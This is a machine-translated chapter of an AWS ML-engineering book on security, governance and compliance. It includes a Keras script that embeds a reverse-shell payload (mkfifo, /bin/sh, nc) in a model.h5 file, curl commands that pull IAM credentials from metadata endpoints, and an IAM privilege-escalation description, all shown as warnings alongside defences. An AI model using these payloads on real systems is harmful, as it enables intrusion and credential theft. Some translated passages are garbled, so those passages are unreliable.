@@ -1,0 +1,977 @@
+<html><head/><body>
+
+
+
+
+
+
+
+
+
+<title>Chapter 9: Security, Governance, and Compliance Strategies</title>
+
+
+
+
+
+
+
+<div><div><h1 class="chapter-number" id="_idParaDest-175"><a id="_idTextAnchor187"/> <a id="_idTextAnchor188"/> 9</h1>
+
+<h1 id="_idParaDest-176"><a id="_idTextAnchor189"/>安全、治理和合规战略</h1>
+
+<p>在本书的前八章中，我们专注于让我们的<strong class="bold">机器学习</strong> ( <strong class="bold"> ML </strong>)实验和部署在云中工作。除此之外，我们还能够使用各种服务来分析、清理和转换几个样本数据集。对于一些实际操作的例子，我们利用了合成生成的数据集，从安全的角度来看，这些数据集使用起来相对安全(因为这些数据集不包含<strong class="bold">个人身份信息</strong> ( <strong class="bold"> PII </strong>))。在前面的章节中，我们已经完成了很多事情，但是需要注意的是，让<strong class="bold">数据工程</strong>和<strong class="bold"> ML工程</strong>工作负载在我们的AWS账户中运行只是第一步！一旦我们需要处理生产级别的ML需求，我们就不得不担心ML系统和流程的<strong class="bold">安全性</strong>、<strong class="bold">治理</strong>和<strong class="bold">符合性</strong>的其他挑战。为了应对这些挑战，我们必须使用各种解决方案和技术来帮助我们预防、检测、缓解和报告这些问题。</p>
+
+<p>在本章中，我们将讨论以下主题:</p>
+
+<ul>
+
+<li>管理ML环境的安全性和合规性</li>
+
+<li>保护数据隐私和模型隐私</li>
+
+<li>建立ML治理</li>
+
+</ul>
+
+<p>与本书中的其他章节不同，本章将不包括完整的分步解决方案，因为我们将讨论广泛的安全主题。这些主题将涵盖关于如何保护我们在前面章节中讨论的不同服务和解决方案的不同策略和技术。对于这些主题中的每一个，我们将更深入地探究相关的副主题。我们还将讨论几个安全最佳实践，它们可以很容易地在AWS上运行的现有ML环境上实现。牢记这些目标，让我们开始吧！</p>
+
+<h1 id="_idParaDest-177"><a id="_idTextAnchor190"/>管理ML环境的安全性和合规性</h1>
+
+<p>数据科学团队通常花费大量时间处理数据，训练<a id="_idIndexMarker1048"/> ML模型，并将模型部署到<a id="_idIndexMarker1049"/>推理端点。由于成功实现其主要目标需要大量的工作和研究，这些团队通常不重视任何与安全性和法规遵从性相关的“额外工作”。在云中运行生产级ML工作负载几个月后，由于以下原因，这些团队可能会遇到各种与安全相关的问题:</p>
+
+<ul>
+
+<li><em class="italic">对安全性、治理和合规性的重要性缺乏理解和认识</em></li>
+
+<li><em class="italic">对相关合规法规和政策缺乏了解</em></li>
+
+<li><em class="italic">缺乏可靠的安全流程和标准</em></li>
+
+<li><em class="italic">内部跟踪和报告机制不佳</em></li>
+
+</ul>
+
+<p>为了更好地了解如何正确管理和处理这些问题，我们将在本节中深入探讨以下主题:</p>
+
+<ul>
+
+<li>认证和授权</li>
+
+<li>网络安全性</li>
+
+<li>静态和传输中的加密</li>
+
+<li>管理合规报告</li>
+
+<li>漏洞管理</li>
+
+</ul>
+
+<p>我们将从如何使用<strong class="bold"> AWS身份和访问管理</strong> ( <strong class="bold"> IAM </strong>)服务来保护我们在前面章节中使用的不同ML工程和数据工程服务的最佳实践开始<a id="_idIndexMarker1050"/>。</p>
+
+<h2 id="_idParaDest-178"><a id="_idTextAnchor191"/>认证和授权</h2>
+
+<p>在<a href="B18638_04.xhtml#_idTextAnchor079"> <em class="italic">第4章</em> </a>、<em class="italic">AWS上的无服务器数据管理</em>中，我们创建了一个IAM用户，并为其附加了一些<a id="_idIndexMarker1051"/>现有策略。除此之外，我们还创建并附加了一个定制的内嵌策略，赋予IAM用户必要的权限来管理<strong class="bold">红移无服务器</strong>和<strong class="bold">湖泊形成</strong>资源。如果你曾经做过这一章的实践解决方案，你可能会想，<em class="italic">为什么要大费周章地设置它呢？首先，在撰写本文时，Redshift Serverless不支持使用root帐户执行查询。同时，使用具有有限权限集的IAM用户比直接使用root帐户更安全。这限制了攻击者在用户帐户受到威胁的情况下可能造成的损害。</em></p>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">在我们的例子中，如果IAM(非根)用户帐户受到损害，攻击者只能对我们的<a id="_idIndexMarker1053"/>红移无服务器和湖泊形成资源造成损害(除非他们能够执行<strong class="bold">权限提升攻击</strong>)。这个话题我们一会儿再详细说！</p>
+
+<p>如果root帐户的访问密钥和/或凭据被盗，攻击者将完全访问所有AWS服务的所有资源。另一方面，如果权限有限的IAM用户的访问密钥和/或凭据被盗，攻击者将只能访问IAM用户可以访问的资源。</p>
+
+<p>假设我们不小心将以下代码推送到GitHub或GitLab中的公共存储库中:</p>
+
+<pre class="source-code">import boto3
+
+sagemaker_client = boto3.client(
+
+    'sagemaker-runtime',
+
+    aws_access_key_id=<strong class="bold">"&lt;INSERT ACCESS KEY ID&gt;"</strong>,
+
+    aws_secret_access_key=<strong class="bold">"&lt;INSERT SECRET ACCESS KEY&gt;"</strong>
+
+)</pre>
+
+<p>假设这里使用的凭据链接到一个root帐户用户，攻击者可以使用这些凭据进行“大规模破坏”，例如删除帐户中的所有现有资源或创建将用于攻击其他帐户的新资源。</p>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout"><em class="italic">如何？</em>一种可能的做法是，黑客使用从源代码获得的凭证和推送到公共存储库的历史来配置AWS CLI，然后运行AWS CLI命令，终止AWS帐户中所有正在运行的资源。</p>
+
+<p>为了防止<a id="_idIndexMarker1054"/>这样的场景发生，我们可以使用下面的<a id="_idIndexMarker1055"/>代码块来代替:</p>
+
+<pre class="source-code">sagemaker_client = boto3.client('sagemaker-runtime')</pre>
+
+<p>在这里，我们期望<code>boto3</code>自动定位并使用来自脚本运行环境的凭证。例如，如果脚本在AWS Cloud9环境中运行，凭证可能存储在<code>~/.aws</code>目录中。</p>
+
+<p>除此之外，这里的<a id="_idIndexMarker1056"/>是一些确保IAM设置安全的最佳实践和推荐步骤:</p>
+
+<ul>
+
+<li>停止使用并删除AWS root帐户的访问密钥(如果可能)。</li>
+
+<li>对root帐户和所有IAM <a id="_idIndexMarker1057"/>用户启用<strong class="bold">多因素认证</strong> ( <strong class="bold"> MFA </strong>)。</li>
+
+<li>定期轮换访问密钥和密码。</li>
+
+<li>尽可能使用(并假设)IAM角色来委派权限，而不是使用长期密码或访问密钥凭据。</li>
+
+<li>如果可能，定期(例如，每90天)过期并轮换密码和密钥。</li>
+
+<li>使用<strong class="bold"> IAM策略模拟器</strong>和<strong class="bold"> IAM访问分析器实现<a id="_idIndexMarker1058"/>最低权限配置<a id="_idIndexMarker1059"/>。</strong></li>
+
+</ul>
+
+<p>除了遵循最佳实践，我们还应该定期检查任何IAM权限配置错误。我们必须花时间深入挖掘并验证什么是可利用的。首先，对IAM用户具有有限权限集的攻击者可以执行<code>iam:AddUserToGroup</code>权限，<a id="_idIndexMarker1062"/>攻击者可以使用AWS CLI(或任何替代方法)将IAM用户添加到现有的IAM组，该IAM组具有较少的权限集。如果<code>AdministratorAccess</code>托管策略被附加到一个现有的IAM组，攻击者可以将受损的IAM用户添加到附加了<code>AdministratorAccess</code>托管策略的组，以获得对整个AWS帐户的完全管理员访问权限。请注意，这只是可能的情况之一，还有其他几种已知的权限提升方法。在某些情况下，攻击者在获得完全管理员访问权限之前，可能会使用这些技术的链或组合。为了防止这些类型的攻击，我们应该尽可能避免授予<code>iam:*</code>权限。</p>
+
+<p>此时，你可能想知道，<em class="italic">我们如何测试我们的AWS账户</em>的安全性？有几个工具，包括开源开发框架和安全测试工具包<a id="_idIndexMarker1063"/>如<strong class="bold"> Pacu </strong>、<strong class="bold"> ScoutSuite </strong>和<strong class="bold"> WeirdAAL </strong> ( <strong class="bold"> AWS攻击库</strong>)可以用于<a id="_idIndexMarker1065"/>评估和测试云环境的安全性。我们不会在本书中讨论如何使用这些工具，所以请随意单独查看这些工具。</p>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">当攻击者获得AWS帐户的完全管理员访问权限时会发生什么？嗯，各种可怕的事情都可能发生！首先，攻击者现在可以自由地旋转AWS资源，比如EC2实例，这些资源可以用来攻击其他帐户和系统。攻击者还可以使用受损的帐户来挖掘加密货币(例如，比特币)。攻击者还应该能够窃取和访问受影响的AWS帐户中托管的数据库中存储的数据。也有可能删除所有AWS资源。</p>
+
+<p>在结束本节之前，让我们讨论一下SageMaker执行角色是如何工作的，这样我们就可以更好地了解如何提高ML环境设置的安全性。当我们使用<code>get_execution_role</code>函数时，我们被赋予为SageMaker Studio或代码运行的Notebook实例创建的IAM角色:</p>
+
+<pre class="source-code">from sagemaker import get_execution_role
+
+role = <strong class="bold">get_execution_role()</strong></pre>
+
+<p>根据这个IAM角色的设置方式，它可能附带有<code>AmazonSageMakerFullAccess</code> IAM策略，该策略授予对几个AWS服务的访问权限。如果配置了一组限制较少的权限，可以获得SageMaker Studio或Notebook实例访问权限的攻击者可能会使用权限提升攻击来获得额外的权限。假设您计划为10名参与者举办一次ML研讨会。为了进行设置，首先为每个参与者创建一个IAM用户来访问一个专用的笔记本实例(或相应的SageMaker Studio域和用户集)，如下图所示:</p>
+
+<div><div><img alt="Figure 9.1 – Sample IAM configuration of an ML workshop environment&#10;&#10;" height="722" src="img/B18638_09_001.jpg" width="1177"/>
+
+</div>
+
+</div>
+
+<p class="IMG---Caption" lang="en-US" xml:lang="en-US">图9.1–ML车间环境的示例IAM配置</p>
+
+<p>在这里，IAM用户只有列出和访问可用笔记本实例的权限。但是，笔记本实例附加了IAM角色，这些角色可能具有额外的权限，攻击者可能会利用这些权限。也就是说，一旦攻击者(作为研讨会参与者)使用一个IAM用户访问研讨会期间可用的一个笔记本实例<a id="_idIndexMarker1068"/>，攻击者<a id="_idIndexMarker1069"/>可以在笔记本实例的终端内简单地打开一个<code>curl</code>命令:</p>
+
+<pre class="source-code">curl http://169.254.169.254/latest/meta-data/identity-
+
+credentials/ec2/security-credentials/ec2-instance</pre>
+
+<p>或者，如果您已经设置并使用<strong class="bold"> SageMaker Studio </strong>来代替车间，攻击者可以运行以下命令并获得安全凭证:</p>
+
+<pre class="source-code">curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</pre>
+
+<p>一旦凭证被泄露，攻击者现在就有了各种关于如何使用这些凭证来执行特定攻击的选项。<em class="italic">吓人吧？</em>如果附加到笔记本实例的IAM角色具有附加到它的<code>AdministratorAccess</code>托管策略，会怎么样？这意味着攻击者将能够使用权限提升攻击获得完全的管理员访问权限！</p>
+
+<p>为了减轻和管理与此类场景相关的风险，建议在配置附加到AWS资源的IAM角色时实践最小特权原则。这意味着我们需要更深入地研究附加到IAM角色的策略，并检查哪些权限可以删除或减少。这将限制潜在的损害，即使在特权提升攻击已经执行之后。除此之外，如果您要举办一次ML研讨会，您可能希望利用<strong class="bold"> SageMaker Studio Lab </strong>，而不是在您的AWS帐户中创建笔记本实例供<a id="_idIndexMarker1070"/>参与者使用。通过这种方法，研讨会参与者可以在不使用AWS帐户的情况下运行ML培训实验和部署。同时，使用SageMaker Studio Lab是免费的，非常适合研讨会！</p>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">关于这个话题的更多信息<a id="_idIndexMarker1071"/>，请查看<a href="https://studiolab.sagemaker.aws/">https://studiolab.sagemaker.aws/</a>。</p>
+
+<h2 id="_idParaDest-179"><a id="_idTextAnchor192"/>网络安全</h2>
+
+<p>在训练和部署ML模型时，ML工程师可能会意外地使用包含攻击者准备的恶意代码的库或自定义容器映像。例如，攻击者可能会生成一个包含反向shell负载的<code>model.h5</code>文件:</p>
+
+<pre class="source-code">import tensorflow
+
+from tensorflow.keras.layers import Input, Lambda, Softmax
+
+from tensorflow.keras.models import Model
+
+from tensorflow.keras.optimizers import Adam
+
+def <strong class="bold">custom_layer</strong>(tensor):
+
+    <strong class="bold">PAYLOAD</strong> = 'rm /tmp/FCMHH; mkfifo /tmp/FCMHH; cat /tmp/FCMHH | /bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 14344 &gt; /tmp/FCMHH'
+
+    <strong class="bold">__import__('os').system(PAYLOAD)</strong>
+
+    
+
+    return tensor
+
+input_layer = Input(shape=(10), name="input_layer")
+
+lambda_layer = Lambda(
+
+    <strong class="bold">custom_layer</strong>,   
+
+    name="lambda_layer"
+
+)(input_layer)
+
+output_layer = Softmax(name="output_layer")(lambda_layer)
+
+model = Model(input_layer, output_layer, name="model")
+
+model.compile(optimizer=Adam(lr=0.0004), loss="categorical_crossentropy")
+
+<strong class="bold">model.save("model.h5")</strong></pre>
+
+<p>在这里，攻击者利用<strong class="bold"> Keras Lambda层</strong>的<a id="_idIndexMarker1074"/>优势来运行定制函数。加载<a id="_idIndexMarker1075"/>生成的文件类似于使用TensorFlow加载其他模型的方式:</p>
+
+<pre class="source-code">from tensorflow.keras.models import load_model
+
+load_model("model.h5")</pre>
+
+<p>这有不同的<a id="_idIndexMarker1076"/>变体，包括给pickle文件和YAML文件注入一个有效载荷，这会影响其他<a id="_idIndexMarker1077"/>库和框架，比如<em class="italic"> scikit-learn </em>和<em class="italic"> PyTorch </em>。</p>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">有关如何在ML模型文件中注入恶意有效载荷的更多示例，请查看<a href="https://gist.github.com/joshualat/a3fdfa4d49d1d6725b1970133d06866b">https://gist . github . com/Joshua lat/a 3 fdfa 4d 49 D1 d 6725 b 1970133d 06866 b</a>。</p>
+
+<p>一旦反向shell负载在ML实例的训练和推理容器中执行，攻击者就能够访问数据并将其传输到外部服务器。为了防止这些类型的攻击，我们可以启用<code>Estimator</code>对象，类似于下面的代码块所示:</p>
+
+<pre class="source-code">estimator = Estimator(
+
+    image,
+
+    role,
+
+    instance_type='ml.p2.xlarge',
+
+    ...
+
+    <strong class="bold">enable_network_isolation=True</strong>
+
+)</pre>
+
+<p>一旦我们在后面的步骤中使用<code>fit()</code>方法运行训练作业，当训练作业运行时，ML <a id="_idIndexMarker1079"/>实例中的训练容器将不再具有网络访问权。</p>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">当然，我们的第一层防御是避免使用来自不可信和潜在危险来源的模型和代码。然而，尽管我们的初衷是好的，我们仍然可能会意外地下载受损的资源。这就是为什么我们需要利用网络隔离解决方案作为下一层防御的原因。</p>
+
+<p>我们可以通过准备和使用一个<strong class="bold"> VPC </strong>进行类似的安全设置，但不包括以下内容:</p>
+
+<ul>
+
+<li>一个<strong class="bold">互联网网关</strong>，使公共子网中的<a id="_idIndexMarker1080"/>资源能够访问互联网</li>
+
+<li>一个<strong class="bold"> NAT网关</strong>，它<a id="_idIndexMarker1081"/>允许私有子网中的资源建立“单向”出站连接</li>
+
+<li>允许来自VPC内外的资源相互通信的其他类似网关</li>
+
+</ul>
+
+<p>通过这种设置，部署在VPC内部的资源将无法连接到互联网。也就是说，如果我们在VPC部署的EC2实例中运行包含恶意代码的训练脚本，恶意代码将无法访问互联网和连接到VPC以外的服务器和资源。<em class="italic">如果我们想从S3存储桶上传和下载文件，该怎么办？</em>为了使其工作，我们将需要配置<strong class="bold"> VPC端点</strong>来启用到AWS服务(如S3)的网络连接。如果我们想要连接到另一个VPC内部的资源<a id="_idIndexMarker1082"/>，我们可以使用<strong class="bold"> AWS PrivateLink </strong>并使用它们的私有IP地址访问这些<a id="_idIndexMarker1083"/>资源。使用这种方法，在使用AWS PrivateLink(一个接口VPC端点)时，不需要通过internet访问资源，也不需要存在internet网关。</p>
+
+<p>可以设置以下内容<a id="_idIndexMarker1084"/>,以便可以通过PrivateLink更安全地直接访问AWS资源:</p>
+
+<ul>
+
+<li>通过<a id="_idIndexMarker1085"/> PrivateLink访问<strong class="bold">亚马逊雅典娜</strong></li>
+
+<li>通过<a id="_idIndexMarker1086"/> PrivateLink访问<strong class="bold"> AWS Lambda </strong></li>
+
+<li>通过PrivateLink将<a id="_idIndexMarker1087"/>连接到<strong class="bold">亚马逊红移</strong></li>
+
+<li>通过<a id="_idIndexMarker1088"/> PrivateLink调用<strong class="bold"> SageMaker推理端点</strong></li>
+
+<li>通过PrivateLink将<a id="_idIndexMarker1089"/>连接到<strong class="bold"> SageMaker工作室</strong></li>
+
+<li>通过PrivateLink访问<strong class="bold"> API网关</strong>API<a id="_idIndexMarker1090"/></li>
+
+</ul>
+
+<p>请注意，这不是使用PrivateLink可以保护的内容的详尽列表，因为还有一长串与PrivateLink集成的服务。</p>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">有关支持的服务列表的更多信息，请查看<a href="https://docs.aws.amazon.com/vpc/latest/privatelink/aws-services-privatelink-support.xhtml">https://docs . AWS . Amazon . com/VPC/latest/private link/AWS-services-private link-support . XHTML</a>。</p>
+
+<h2 id="_idParaDest-180"><a id="_idTextAnchor193"/>静态和传输中的加密</h2>
+
+<p>当<a id="_idIndexMarker1093"/>训练ML模型时，SageMaker <a id="_idIndexMarker1092"/>支持多种数据源选项。在大多数<a id="_idIndexMarker1094"/>情况下，ML工程师默认使用<strong class="bold">亚马逊S3 </strong>桶作为<a id="_idIndexMarker1095"/>默认数据源。在其他情况下，将使用<strong class="bold">亚马逊弹性文件系统</strong> ( <strong class="bold">亚马逊EFS </strong>)，尤其是对于需要更高吞吐量的工作负载。对于更高的性能<a id="_idIndexMarker1096"/>吞吐量需求，我们可以为Lustre 使用<strong class="bold"> Amazon FSx(它可能链接到源的S3桶)。这些存储<a id="_idIndexMarker1097"/>选项与<strong class="bold"> AWS密钥管理服务</strong> ( <strong class="bold"> AWS KMS </strong>)相集成，这有助于确保数据在写入文件系统之前被自动加密(也就是说，没有密钥就无法读取)。一旦需要加载和读取数据，就会自动解密。</strong></p>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">更多关于密码学概念的<a id="_idIndexMarker1098"/>信息<a id="_idIndexMarker1099"/>如<strong class="bold">非对称和对称加密</strong>、<strong class="bold">解密</strong>和<strong class="bold">信封加密</strong>，请随意查看<a id="_idIndexMarker1101"/>https://docs . AWS . Amazon . com/crypto/latest/user guide/cryptography-concepts . XHTML。</p>
+
+<p>注意，使用KMS时，我们有两个<a id="_idIndexMarker1102"/>选项。第一个涉及使用默认的<strong class="bold"> AWS管理的密钥</strong>，第二个涉及创建和使用<strong class="bold">客户管理的密钥</strong>。<em class="italic">我们何时应该使用客户管理的密钥？</em>如果我们想要更多的控制，例如<a id="_idIndexMarker1103"/>启用密钥沿<a id="_idIndexMarker1104"/>旋转，并带有撤销、禁用或删除密钥<a id="_idIndexMarker1105"/>访问的选项，那么我们应该选择使用客户管理的密钥。如果您想知道连接到培训和托管实例的存储卷是否可以用KMS客户管理的密钥加密，那么答案也是<em class="italic">是的</em>。要使用客户管理的密钥，我们只需指定一个可选的KMS密钥ID，类似于下面的代码块:</p>
+
+<pre class="source-code">estimator = Estimator(
+
+    image,
+
+    ...
+
+    volume_kms_key=<strong class="bold">&lt;insert kms key ARN&gt;</strong>,
+
+    output_kms_key=<strong class="bold">&lt;insert kms key ARN&gt;</strong>
+
+)
+
+...
+
+estimator.deploy(
+
+    ...
+
+    kms_key=<strong class="bold">&lt;insert kms key ARN&gt;</strong>
+
+)</pre>
+
+<p>在这里，我们可以看到，我们还可以指定一个可选的KMS密钥，用于加密亚马逊S3中的输出文件。除了加密静态数据，我们还需要在执行分布式培训时确保安全的数据传输。当执行培训作业时使用多个实例时，我们可以启用<strong class="bold">容器间流量加密</strong>来保护实例间传输的数据。如果我们需要遵守特定的法规要求，我们需要确保传输的数据也是加密的。</p>
+
+<p>使用<strong class="bold"> SageMaker Python SDK </strong>时，启用容器间流量加密非常简单:</p>
+
+<pre class="source-code">estimator = Estimator(
+
+    image,
+
+    ...
+
+    <strong class="bold">encrypt_inter_container_traffic=True</strong>
+
+)</pre>
+
+<p>那不是很容易吗？在启用集装箱间流量加密之前，请确保您了解其对整体培训时间和培训工作成本的潜在影响。当使用<a id="_idIndexMarker1107"/>分布式深度学习<a id="_idIndexMarker1108"/>算法时，在增加这一额外的安全级别后，整体训练时间和成本可能会增加。对于<code>NetworkConfig</code>对象，类似于下面的代码块:</p>
+
+<pre class="source-code">config = NetworkConfig(
+
+    enable_network_isolation=True,
+
+    <strong class="bold">encrypt_inter_container_traffic=True</strong>
+
+)
+
+processor = ScriptProcessor(
+
+    ...
+
+    <strong class="bold">network_config=config</strong>
+
+)
+
+processor.run(
+
+    ...
+
+)</pre>
+
+<p>请注意，这种方法应该适用于不同“类型”的处理作业，如下所示:</p>
+
+<ul>
+
+<li><code>SageMakerClarifyProcessor</code>用于模型可解释性需求和自动化偏差度量计算</li>
+
+<li><code>PySparkProcessor</code>用于加工使用<strong class="bold"> PySpark </strong>的工作</li>
+
+<li><code>SKLearnProcessor</code>使用<strong class="bold"> scikit-learn </strong>加工作业</li>
+
+</ul>
+
+<p>SageMaker还支持在处理数据、训练和部署模型时使用定制容器映像。这些集装箱图片，存储在<code>docker push</code>命令里面，ECR自动加密这些图片。一旦这些容器图像被提取(例如，使用<code>docker pull</code>命令)，ECR自动解密这些图像。</p>
+
+<p>除此之外，我们可以用KMS在SageMaker中加密以下内容:</p>
+
+<ul>
+
+<li>SageMaker Studio存储卷</li>
+
+<li>SageMaker处理作业的输出文件</li>
+
+<li>SageMaker地面实况标注作业的输出数据</li>
+
+<li>SageMaker特色店线上和线下店</li>
+
+</ul>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">这可能是我们第一次在这本书里提到<strong class="bold"> SageMaker地面真相</strong>和<strong class="bold"> SageMaker特色店</strong>！如果你想知道这些是什么，SageMaker Ground Truth是一个数据标注<a id="_idIndexMarker1112"/>服务，帮助ML从业者使用各种选项准备高质量的标注数据集，而SageMaker Feature Store是一个完全管理的要素存储，ML模型的要素可以在其中存储、共享和<a id="_idIndexMarker1113"/>管理。我们不会在本书中深入讨论这些如何工作的细节<a id="_idIndexMarker1114"/>，所以请随意查看<a href="https://docs.aws.amazon.com/sagemaker/latest/dg/data-label.xhtml">https://docs . AWS . Amazon . com/sage maker/latest/DG/data-label . XHTML</a>和https://docs . AWS . Amazon . com/sage maker/latest/DG/feature-store . XHTML了解这些主题的更多细节。</p>
+
+<p>如果我们在SageMaker之外执行数据处理、模型训练和模型部署，会怎么样？好消息是AWS平台中的许多服务<a id="_idIndexMarker1115"/>都与KMS集成在一起。这意味着<a id="_idIndexMarker1116"/>通常只是启用服务器端加密的一个小的配置更改。以下是KMS立即可用的一些示例:</p>
+
+<ul>
+
+<li>EBS卷加密</li>
+
+<li>红移群集加密</li>
+
+<li>亚马逊S3对象的加密</li>
+
+<li>对由Glue DataBrew作业写入的数据加密</li>
+
+<li>加密存储在CloudWatch日志中的日志数据</li>
+
+</ul>
+
+<p>我们还可以使用<strong class="bold"> AWS Encryption SDK </strong>在将数据发送到AWS <a id="_idIndexMarker1117"/>服务(例如，亚马逊S3)之前对数据进行加密。使用相同的客户端加密库，我们可以在从存储位置检索数据后对其进行解密。</p>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">在AWS上处理加密<a id="_idIndexMarker1119"/>和解密需求时，有几个<a id="_idIndexMarker1118"/>选项可供选择。除了<a id="_idIndexMarker1120"/>到<strong class="bold"> AWS KMS </strong>和<strong class="bold"> AWS加密SDK </strong>，还有<a id="_idIndexMarker1121"/>dynamo db加密客户端和<strong class="bold"> AWS CloudHSM </strong>。我们不会深入研究其中的每一个，所以请查看https://docs . AWS . Amazon . com/crypto/latest/user guide/AWS cryp-choose-toplevel . XHTML以了解更多信息。</p>
+
+<p>除了已经讨论过的内容之外，我们还必须知道一些额外的技术，这些技术是关于在使用EC2实例满足ML需求时如何保护和加密传输中的数据的。在<a href="B18638_02.xhtml#_idTextAnchor041"> <em class="italic">第二章</em> </a>、<em class="italic">深度学习AMIs </em>中，我们从一个<a id="_idIndexMarker1123"/> EC2实例内部的命令行启动了<strong class="bold"> Jupyter笔记本</strong>应用<a id="_idIndexMarker1122"/>。您可能已经注意到，我们使用HTTP而不是HTTPS来访问应用程序。我们可以做的改进之一是使用SSL(使用web证书)来加密服务器和浏览器之间的流量。另一个解决方案是使用<strong class="bold"> SSH隧道</strong>访问Jupyter笔记本应用程序。<em class="italic">宋承宪什么？</em> SSH隧道是一种机制，涉及<a id="_idIndexMarker1124"/>在两台计算机之间使用加密的SSH连接，通过安全通道转发连接:</p>
+
+<div><div><img alt="Figure 9.2 – SSH tunneling&#10;&#10;" height="539" src="img/B18638_09_002.jpg" width="1124"/>
+
+</div>
+
+</div>
+
+<p class="IMG---Caption" lang="en-US" xml:lang="en-US">图9.2–SSH隧道</p>
+
+<p>在这里，我们可以看到我们可以从本地机器访问Jupyter Notebook应用程序，即使该应用程序运行在EC2实例中。这里，我们利用SSH隧道通过SSH在安全通道上转发连接。</p>
+
+<p>为此，我们只需运行类似于下面命令块中的命令(假设我们的本地机器是Unix操作系统):</p>
+
+<pre class="source-code">ssh &lt;user&gt;@&lt;IP address of instance&gt; -NL 14344:localhost:8888</pre>
+
+<p>在命令运行之后，我们<a id="_idIndexMarker1125"/>应该能够通过在浏览器中访问以下链接来本地访问<a id="_idIndexMarker1126"/> Jupyter笔记本应用程序:<a href="http://localhost:14344"> http://localhost:14344 </a>。</p>
+
+<p>现在，我们已经讨论了几种加密数据的技术，让我们继续讨论一些可以用来帮助我们管理环境合规性的服务。</p>
+
+<h2 id="_idParaDest-181"><a id="_idTextAnchor194"/>管理合规报告</h2>
+
+<p>除了确保ML环境和系统的安全，数据科学团队管理AWS帐户中使用的流程和资源配置的<a id="_idIndexMarker1127"/>整体合规性也至关重要。管理合规性包括确定一个<a id="_idIndexMarker1128"/>组织需要<a id="_idIndexMarker1129"/>遵守的相关法规和指导方针(例如<strong class="bold"> HIPAA </strong>、<strong class="bold"> PCI-DSS </strong>和<strong class="bold"> GDPR </strong>)以及<a id="_idIndexMarker1130"/>执行建议的一组步骤来实现(并保持)所需的合规性。</p>
+
+<p>AWS和客户共享安全性和合规性。客户通常需要关注以下几个方面:</p>
+
+<ul>
+
+<li>客户操作系统</li>
+
+<li>任何运行在AWS服务之上的应用程序</li>
+
+<li>所使用的不同AWS资源的配置</li>
+
+</ul>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">关于<strong class="bold">共享责任模式</strong>的更多细节<a id="_idIndexMarker1131"/>，请查看<a href="https://aws.amazon.com/compliance/shared-responsibility-model/">https://AWS . Amazon . com/compliance/Shared-respons ibility-Model/</a>。</p>
+
+<p>在处理法规遵从性实施和报告时，AWS中有多种服务、工具和功能可用:</p>
+
+<ul>
+
+<li><strong class="bold"> AWS工件</strong>:这是<a id="_idIndexMarker1132"/>安全和合规文档、报告和资源的集中来源。在这里，我们可以下载我们需要的相关安全性和合规性文档。</li>
+
+<li><strong class="bold"> AWS配置</strong>:这可以<a id="_idIndexMarker1133"/>用于持续监控AWS资源的配置，并实现自动修复，以确保ML环境和系统的合规性。</li>
+
+<li><strong class="bold"> AWS审计经理</strong>:这<a id="_idIndexMarker1134"/>有助于简化AWS资源的风险和合规性评估。</li>
+
+<li><strong class="bold"> AWS合规中心</strong>:这是<a id="_idIndexMarker1135"/>云相关监管资源的集中来源。</li>
+
+</ul>
+
+<p>我们不会深究如何使用这些服务的<a id="_idIndexMarker1136"/>细节，所以请随意查看本章末尾的<em class="italic">延伸阅读</em>部分以了解更多细节。在下一节中，我们将快速讨论一些可以帮助我们进行漏洞管理的相关服务。</p>
+
+<h2 id="_idParaDest-182"><a id="_idTextAnchor195"/>漏洞管理</h2>
+
+<p>实施安全最佳实践并不能保证环境或系统免受<a id="_idIndexMarker1137"/>攻击。除了遵循安全最佳实践和法规遵从性要求之外，团队还应该使用各种漏洞评估和管理工具来检查系统中潜在的可利用漏洞。</p>
+
+<p>在检测和管理AWS中的漏洞时，<a id="_idIndexMarker1138"/>使用的一个实用解决方案是<strong class="bold">亚马逊检查员</strong>。Amazon Inspector通过自动检测EC2实例和推送到Amazon ECR的容器映像中的漏洞<a id="_idIndexMarker1139"/>，实现了<strong class="bold">自动化漏洞管理</strong>。这是如何工作的？每次检测到“变化”(例如，容器映像推送到ECR)，Amazon Inspector都会自动扫描资源，因此用户无需启动手动漏洞扫描。这意味着，如果我们正在为一个<strong class="bold"> SageMaker处理</strong>作业、培训作业或ML推理端点准备和构建一个定制的容器映像，那么每当我们向Amazon ECR存储库推送一个新版本时，Amazon Inspector都会自动为我们扫描容器映像。如果Amazon Inspector检测到并报告了漏洞，下一步我们将对受影响的资源执行必要的补救措施。</p>
+
+<p class="callout-heading">注意</p>
+
+<p class="callout">关于如何使用和设置Amazon Inspector的分步教程，请查看<a href="https://medium.com/@arvs.lat/automated-vulnerability-management-on-aws-with-amazon-inspector-53c572bf8515">https://medium . com/@ arvs . lat/automated-vulnerability-management-on-AWS-with-Amazon-Inspector-53c 572 BF 8515</a>。</p>
+
+<p>除了Amazon Inspector，我们还可以使用以下服务和功能来管理AWS上ML环境中的安全风险和漏洞:</p>
+
+<ul>
+
+<li><strong class="bold">亚马逊CodeGuru Reviewer </strong>:这个<a id="_idIndexMarker1141"/>可以用来分析<a id="_idIndexMarker1142"/>代码，使用<strong class="bold">安全检测器自动检测安全问题。</strong></li>
+
+<li><strong class="bold"> Amazon GuardDuty </strong>:这可以用来自动检测恶意活动，例如AWS帐户中的<a id="_idIndexMarker1143"/>权限提升攻击..</li>
+
+<li><strong class="bold"> AWS安全中枢</strong>:这个<a id="_idIndexMarker1144"/>可以用来自动化安全检查，进行云安全态势管理。</li>
+
+</ul>
+
